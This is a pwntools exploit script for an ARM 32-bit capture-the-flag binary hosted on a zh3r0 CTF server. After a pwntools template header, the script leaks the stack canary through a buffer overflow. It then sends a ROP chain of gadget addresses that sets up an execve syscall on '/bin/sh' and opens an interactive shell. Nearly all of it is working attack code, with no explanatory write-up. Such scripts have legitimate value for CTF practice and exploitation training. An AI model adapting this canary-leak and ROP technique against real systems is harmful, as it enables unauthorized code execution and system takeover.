#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host europe.pwn.zh3r0.ml --port 2397 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'europe.pwn.zh3r0.ml'
port = int(args.PORT or 2397)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
gdb-multiarch
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     arm-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x10000)

io = start()
io.recvuntil('you? \n')
shellcode = '/bin/sh\x00'
io.sendline(shellcode)
io.recvuntil('to me? \n')
io.send('A'*30 + 'BBB')
io.recvuntil('BBB')
stack_canary = u32('\x00' + io.recvn(3))
log.info(hex(stack_canary))
io.recvuntil('suggest? \n')
io.sendline('yes')
io.recvuntil('to me? \n')
bss = 0x0088678
pop_r0_pc = 0x00027324 #: pop {r0, r4, pc}
pop_r1_pc = 0x0005e690 #: pop {r1, pc}
mov_r0_r2 = 0x0029B44
pop_r7_pc = 0x00028a0c #: pop {r7, pc}
rop = flat([
	'A'*32,
	stack_canary,
	'B'*4,
	pop_r1_pc,	
	0x0,
	pop_r0_pc,
	0x0,
	0x0,
	mov_r0_r2,
	0x0,0x0,0x0,
	pop_r0_pc,
	bss,
	0x0,
	pop_r7_pc,
	0xb,
	0x0002dfdc
])
io.send(rop)
io.recvuntil('suggest? \n')
io.sendline('no')
io.interactive()
